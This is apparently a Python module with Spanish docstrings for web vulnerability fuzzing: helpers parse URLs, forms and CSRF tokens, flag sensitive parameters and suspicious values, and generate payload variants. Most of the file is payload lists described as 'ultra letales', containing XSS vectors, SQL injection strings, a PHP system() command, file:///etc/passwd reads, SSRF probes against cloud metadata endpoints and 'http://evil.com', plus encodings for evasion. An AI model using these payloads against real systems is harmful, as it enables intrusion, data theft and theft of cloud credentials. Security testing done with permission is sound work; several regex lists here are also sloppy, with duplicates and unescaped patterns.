import re
import json
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

def extraer_parametros_url(url):
    """
    Extrae parámetros de la URL como diccionario.
    Ej: ?id=123&usuario=test => {'id': '123', 'usuario': 'test'}
    """
    parsed_url = urlparse(url)
    return {k: v[0] if len(v) == 1 else v for k, v in parse_qs(parsed_url.query).items()}

def extraer_ruta(url):
    """
    Devuelve la ruta de una URL sin parámetros ni dominio.
    Ej: https://dominio.com/perfil/ver?id=2 => /perfil/ver
    """
    return urlparse(url).path

def detectar_ids_enlace(url):
    """
    Extrae posibles identificadores numéricos o UUIDs en la ruta o parámetros.
    """
    posibles_ids = re.findall(r'\b(?:[0-9]{2,}|[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})\b', url, re.I)
    return list(set(posibles_ids))

def es_potencial_id(param):
    """
    Heurística básica para detectar posibles IDs.
    """
    return re.match(r'^\d{2,}$', str(param)) or re.match(r'^[a-f0-9\-]{36}$', str(param), re.I)

def extraer_tokens_csrf(html):
    """
    Extrae posibles tokens CSRF de un formulario HTML.
    """
    soup = BeautifulSoup(html, 'html.parser')
    tokens = {}

    for input_tag in soup.find_all('input', {'type': 'hidden'}):
        nombre = input_tag.get('name') or input_tag.get('id')
        valor = input_tag.get('value')
        if nombre and valor and 'csrf' in nombre.lower():
            tokens[nombre] = valor

    return tokens

def detectar_formularios(html):
    """
    Detecta formularios en una página y devuelve detalles relevantes.
    """
    soup = BeautifulSoup(html, 'html.parser')
    formularios = []

    for form in soup.find_all('form'):
        accion = form.get('action', '')
        metodo = form.get('method', 'get').lower()
        campos = {}
        for campo in form.find_all(['input', 'textarea', 'select']):
            nombre = campo.get('name')
            valor = campo.get('value', '')
            if nombre:
                campos[nombre] = valor
        formularios.append({'action': accion, 'method': metodo, 'fields': campos})

    return formularios

def es_json_valido(posible_json):
    """
    Comprueba si una cadena es un JSON válido.
    """
    try:
        json.loads(posible_json)
        return True
    except:
        return False

def extraer_parametros_post(data):
    """
    Extrae campos de una solicitud POST tipo formulario.
    """
    if isinstance(data, dict):
        return data
    try:
        return {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(data).items()}
    except:
        return {}

def extraer_parametros_json(json_str):
    """
    Extrae parámetros de un JSON válido como diccionario.
    """
    try:
        data = json.loads(json_str)
        if isinstance(data, dict):
            return data
        if isinstance(data, list) and data and isinstance(data[0], dict):
            return data[0]
    except Exception:
        pass
    return {}

def encontrar_parametros_sensibles(diccionario):
    """
    Detecta campos potencialmente sensibles o explotables como ID, usuario, email, etc.
    """
    sensibles = {}
    for k, v in diccionario.items():
        if re.search(r'(id|user|uid|token|mail|email|account)', k, re.I):
            sensibles[k] = v
    return sensibles

def encontrar_parametros_super_sensibles(diccionario):
    """
    Detecta campos ultra sensibles o críticos (ID, usuario, email, token, admin, password, session, csrf, etc).
    """
    sensibles = {}
    patrones = r'(id|user|uid|token|mail|email|account|admin|password|passwd|session|csrf|auth|key|secret|access|priv|role|login|redirect|file|doc|ref|next|callback|dest|continue|data|json|debug|bypass|submit|action|method)'
    for k, v in diccionario.items():
        if re.search(patrones, k, re.I):
            sensibles[k] = v
    return sensibles

def detectar_parametros_duplicados(diccionario):
    """
    Devuelve una lista de parámetros duplicados en el diccionario.
    """
    keys = list(diccionario.keys())
    return list(set([k for k in keys if keys.count(k) > 1]))

def detectar_valores_peligrosos(diccionario):
    """
    Detecta valores sospechosos o peligrosos en los parámetros (payloads, path traversal, SQLi, XSS, etc).
    """
    peligrosos = {}
    patrones = [
        r'\.\./', r'etc/passwd', r'boot\.ini', r'<script>', r'--', r' or ', r' and ', r'1=1', r'0=0', r'alert\(', r'select ', r'insert ', r'delete ', r'update ', r'drop ', r'base64', r'file://', r'data:text', r'javascript:', r'admin', r'root', r'null', r'undefined'
    ]
    for k, v in diccionario.items():
        valor = str(v).lower()
        if any(re.search(p, valor) for p in patrones):
            peligrosos[k] = v
    return peligrosos

def detectar_valores_hiper_peligrosos(diccionario):
    """
    Detecta valores extremadamente peligrosos y letales en los parámetros (RCE, LFI, SSRF, XSS, SQLi, etc).
    """
    hiper_peligrosos = {}
    patrones = [
        r'\.\./', r'etc/passwd', r'boot\.ini', r'<script>', r'--', r' or ', r' and ', r'1=1', r'0=0', r'alert\(', r'select ', r'insert ', r'delete ', r'update ', r'drop ', r'base64', r'file://', r'data:text', r'javascript:', r'admin', r'root', r'null', r'undefined',
        r'<?php', r'eval\(', r'system\(', r'`cat ', r'curl ', r'wget ', r'cmd=', r'cmdline', r'input_file', r'output_file', r'../../', r'..\\', r'%00', r'%2e%2e%2f', r'%c0%af', r'%c1%1c', r'php://', r'zip://', r'glob://', r'phar://', r'data://', r'input=', r'output=', r'passwd', r'flag{', r'ctf{', r'uid=', r'gid=', r'Authorization:', r'Bearer ', r'Basic ', r'0x', r'0b', r'0d', r'0a', r'cookie', r'set-cookie', r'sessionid', r'csrfmiddlewaretoken', r'csrf_token', r'XSS', r'RCE', r'SSRF', r'LFI', r'../../../../', r'<?=', r'<?=',
    ]
    for k, v in diccionario.items():
        valor = str(v).lower()
        if any(re.search(p, valor) for p in patrones):
            hiper_peligrosos[k] = v
    return hiper_peligrosos

def detectar_valores_ultra_criticos(diccionario):
    """
    Detecta valores ultra críticos y letales en los parámetros (indicadores de RCE, LFI, SSRF, XSS, SQLi, XXE, SSTI, etc).
    """
    ultra_criticos = {}
    patrones = [
        r'\.\./', r'etc/passwd', r'boot\.ini', r'<script>', r'--', r' or ', r' and ', r'1=1', r'0=0', r'alert\(', r'select ', r'insert ', r'delete ', r'update ', r'drop ', r'base64', r'file://', r'data:text', r'javascript:', r'admin', r'root', r'null', r'undefined',
        r'<?php', r'eval\(', r'system\(', r'`cat ', r'curl ', r'wget ', r'cmd=', r'cmdline', r'input_file', r'output_file', r'../../', r'..\\', r'%00', r'%2e%2e%2f', r'%c0%af', r'%c1%1c', r'php://', r'zip://', r'glob://', r'phar://', r'data://', r'input=', r'output=', r'passwd', r'flag{', r'ctf{', r'uid=', r'gid=', r'Authorization:', r'Bearer ', r'Basic ', r'0x', r'0b', r'0d', r'0a', r'cookie', r'set-cookie', r'sessionid', r'csrfmiddlewaretoken', r'csrf_token', r'XSS', r'RCE', r'SSRF', r'LFI', r'../../../../', r'<?=', r'<?=',
        r'<!ENTITY', r'<!DOCTYPE', r'<!ENTITY', r'<![CDATA[', r'\$\{.*\}', r'\{\{.*\}\}', r'\$\(', r'\$\{', r'\{\{', r'\}\}', r'\$\{.*\}', r'\$\{.*\}', r'{{7}}', r'{7}', r'{{', r'}}', r'\$\{', r'\}', r'\$\(', r'\$\{.*\}', r'<!--#', r'<!--', r'-->', r'<!--#exec', r'<!--#include', r'<!--#echo', r'<!--#printenv', r'<!--#set', r'<!--#config', r'<!--#flastmod', r'<!--#fsize', r'<!--#if', r'<!--#elif', r'<!--#else', r'<!--#endif'
    ]
    for k, v in diccionario.items():
        valor = str(v).lower()
        if any(re.search(p, valor) for p in patrones):
            ultra_criticos[k] = v
    return ultra_criticos

def generar_variantes_parametros(diccionario):
    """
    Genera variantes letales de los parámetros para fuzzing avanzado.
    """
    variantes = {}
    payloads = [
        '../', '..\\', '%00', '%2e%2e%2f', '<script>alert(1)</script>', "' OR 1=1 --", '" OR "1"="1', 'admin', 'root', 'null', 'undefined', '0', '1', '-1', '2147483647', '0x01', 'A'*1024, 'B'*2048, 'C'*4096
    ]
    for k, v in diccionario.items():
        variantes[k] = [v] + payloads
    return variantes

def generar_variantes_parametros_letales(diccionario):
    """
    Genera variantes ultra letales de los parámetros para fuzzing extremo.
    """
    variantes = {}
    payloads = [
        '../', '..\\', '%00', '%2e%2e%2f', '<script>alert(1)</script>', "' OR 1=1 --", '" OR "1"="1', 'admin', 'root', 'null', 'undefined', '0', '1', '-1', '2147483647', '0x01', 'A'*1024, 'B'*2048, 'C'*4096,
        '<?php system("id"); ?>', '${7*7}', '{{7*7}}', '"><svg/onload=alert(1)>', '"><img src=x onerror=alert(1)>', '"><body onload=alert(1)>', '"><iframe src=javascript:alert(1)>', '"><math href="javascript:alert(1)">', '"><script>confirm(1)</script>', '"><details open ontoggle=alert(1)>', '"><object data="javascript:alert(1)">', '"><embed src="javascript:alert(1)">', '"><a href="javascript:alert(1)">click</a>', '"><form action="javascript:alert(1)">', '"><input onfocus=alert(1) autofocus>', '"><button formaction="javascript:alert(1)">', '"><link rel="import" href="data:text/html,<script>alert(1)</script>">',
        'file:///etc/passwd', 'file:///C:/boot.ini', 'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]', 'http://evil.com', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
    ]
    for k, v in diccionario.items():
        variantes[k] = [v] + payloads
    return variantes

def generar_variantes_parametros_hiper_letales(diccionario):
    """
    Genera variantes hiper letales y agresivas de los parámetros para fuzzing extremo y evasión máxima.
    """
    variantes = {}
    payloads = [
        '../', '..\\', '%00', '%2e%2e%2f', '<script>alert(1)</script>', "' OR 1=1 --", '" OR "1"="1', 'admin', 'root', 'null', 'undefined', '0', '1', '-1', '2147483647', '0x01',
        'A'*1024, 'B'*2048, 'C'*4096, '<?php system("id"); ?>', '${7*7}', '{{7*7}}', '"><svg/onload=alert(1)>', '"><img src=x onerror=alert(1)>', '"><body onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>', '"><math href="javascript:alert(1)">', '"><script>confirm(1)</script>', '"><details open ontoggle=alert(1)>', '"><object data="javascript:alert(1)">',
        '"><embed src="javascript:alert(1)">', '"><a href="javascript:alert(1)">click</a>', '"><form action="javascript:alert(1)">', '"><input onfocus=alert(1) autofocus>',
        '"><button formaction="javascript:alert(1)">', '"><link rel="import" href="data:text/html,<script>alert(1)</script>">',
        'file:///etc/passwd', 'file:///C:/boot.ini', 'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]', 'http://evil.com',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', '"><img src=x onerror=confirm(1)>', '"><svg/onload=confirm(1)>', '"><iframe src=javascript:confirm(1)>',
        '"><math href="javascript:confirm(1)">', '"><object data="javascript:confirm(1)">', '"><embed src="javascript:confirm(1)">', '"><a href="javascript:confirm(1)">click</a>',
        '"><form action="javascript:confirm(1)">', '"><input onfocus=confirm(1) autofocus>', '"><button formaction="javascript:confirm(1)">', '"><link rel="import" href="data:text/html,<script>confirm(1)</script>">',
        '"><img src=x onerror=prompt(1)>', '"><svg/onload=prompt(1)>', '"><iframe src=javascript:prompt(1)>', '"><math href="javascript:prompt(1)">', '"><object data="javascript:prompt(1)">',
        '"><embed src="javascript:prompt(1)">', '"><a href="javascript:prompt(1)">click</a>', '"><form action="javascript:prompt(1)">', '"><input onfocus=prompt(1) autofocus>',
        '"><button formaction="javascript:prompt(1)">', '"><link rel="import" href="data:text/html,<script>prompt(1)</script>">',
        '"><img src=x onerror=alert(document.domain)>', '"><svg/onload=alert(document.domain)>', '"><iframe src=javascript:alert(document.domain)>',
        '"><math href="javascript:alert(document.domain)">', '"><object data="javascript:alert(document.domain)">', '"><embed src="javascript:alert(document.domain)">',
        '"><a href="javascript:alert(document.domain)">click</a>', '"><form action="javascript:alert(document.domain)">', '"><input onfocus=alert(document.domain) autofocus>',
        '"><button formaction="javascript:alert(document.domain)">', '"><link rel="import" href="data:text/html,<script>alert(document.domain)</script>">',
        'file:///windows/win.ini', 'file:///c:/windows/win.ini', 'file:///c:/windows/system32/drivers/etc/hosts', 'file:///etc/hosts',
        'http://0.0.0.0:80', 'http://0.0.0.0:443', 'http://localhost:80', 'http://localhost:443', 'http://127.0.0.1:80', 'http://127.0.0.1:443',
        'http://[::1]:80', 'http://[::1]:443', 'http://169.254.169.254/', 'http://metadata.google.internal/', 'http://metadata/computeMetadata/v1/', 'http://aws.amazon.com/',
        'data:application/json;base64,eyJhZG1pbiI6dHJ1ZX0=', 'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='
    ]
    for k, v in diccionario.items():
        variantes[k] = [v] + payloads
    return variantes

def generar_variantes_parametros_max_letalidad(diccionario):
    """
    Genera variantes con máxima letalidad y evasión para fuzzing avanzado, incluyendo codificaciones y combinaciones.
    """
    import base64, urllib.parse
    variantes = {}
    payloads = [
        '../', '..\\', '%00', '%2e%2e%2f', '<script>alert(1)</script>', "' OR 1=1 --", '" OR "1"="1', 'admin', 'root', 'null', 'undefined', '0', '1', '-1', '2147483647', '0x01',
        'A'*1024, 'B'*2048, 'C'*4096, '<?php system("id"); ?>', '${7*7}', '{{7*7}}', '"><svg/onload=alert(1)>', '"><img src=x onerror=alert(1)>', '"><body onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>', '"><math href="javascript:alert(1)">', '"><script>confirm(1)</script>', '"><details open ontoggle=alert(1)>', '"><object data="javascript:alert(1)">',
        '"><embed src="javascript:alert(1)">', '"><a href="javascript:alert(1)">click</a>', '"><form action="javascript:alert(1)">', '"><input onfocus=alert(1) autofocus>',
        '"><button formaction="javascript:alert(1)">', '"><link rel="import" href="data:text/html,<script>alert(1)</script>">',
        'file:///etc/passwd', 'file:///C:/boot.ini', 'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]', 'http://evil.com',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', '"><img src=x onerror=confirm(1)>', '"><svg/onload=confirm(1)>', '"><iframe src=javascript:confirm(1)>',
        '"><math href="javascript:confirm(1)">', '"><object data="javascript:confirm(1)">', '"><embed src="javascript:confirm(1)">', '"><a href="javascript:confirm(1)">click</a>',
        '"><form action="javascript:confirm(1)">', '"><input onfocus=confirm(1) autofocus>', '"><button formaction="javascript:confirm(1)">', '"><link rel="import" href="data:text/html,<script>confirm(1)</script>">',
        '"><img src=x onerror=prompt(1)>', '"><svg/onload=prompt(1)>', '"><iframe src=javascript:prompt(1)>', '"><math href="javascript:prompt(1)">', '"><object data="javascript:prompt(1)">',
        '"><embed src="javascript:prompt(1)">', '"><a href="javascript:prompt(1)">click</a>', '"><form action="javascript:prompt(1)">', '"><input onfocus=prompt(1) autofocus>',
        '"><button formaction="javascript:prompt(1)">', '"><link rel="import" href="data:text/html,<script>prompt(1)</script>">',
        '"><img src=x onerror=alert(document.domain)>', '"><svg/onload=alert(document.domain)>', '"><iframe src=javascript:alert(document.domain)>',
        '"><math href="javascript:alert(document.domain)">', '"><object data="javascript:alert(document.domain)">', '"><embed src="javascript:alert(document.domain)">',
        '"><a href="javascript:alert(document.domain)">click</a>', '"><form action="javascript:alert(document.domain)">', '"><input onfocus=alert(document.domain) autofocus>',
        '"><button formaction="javascript:alert(document.domain)">', '"><link rel="import" href="data:text/html,<script>alert(document.domain)</script>">',
        'file:///windows/win.ini', 'file:///c:/windows/win.ini', 'file:///c:/windows/system32/drivers/etc/hosts', 'file:///etc/hosts',
        'http://0.0.0.0:80', 'http://0.0.0.0:443', 'http://localhost:80', 'http://localhost:443', 'http://127.0.0.1:80', 'http://127.0.0.1:443',
        'http://[::1]:80', 'http://[::1]:443', 'http://169.254.169.254/', 'http://metadata.google.internal/', 'http://metadata/computeMetadata/v1/', 'http://aws.amazon.com/',
        'data:application/json;base64,eyJhZG1pbiI6dHJ1ZX0=', 'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='
    ]
    for k, v in diccionario.items():
        variantes_k = set([v])
        for p in payloads:
            variantes_k.add(p)
            # Encodings
            try:
                variantes_k.add(urllib.parse.quote(str(p)))
                variantes_k.add(urllib.parse.quote_plus(str(p)))
                variantes_k.add(base64.b64encode(str(p).encode()).decode())
            except Exception:
                pass
        variantes[k] = list(variantes_k)
    return variantes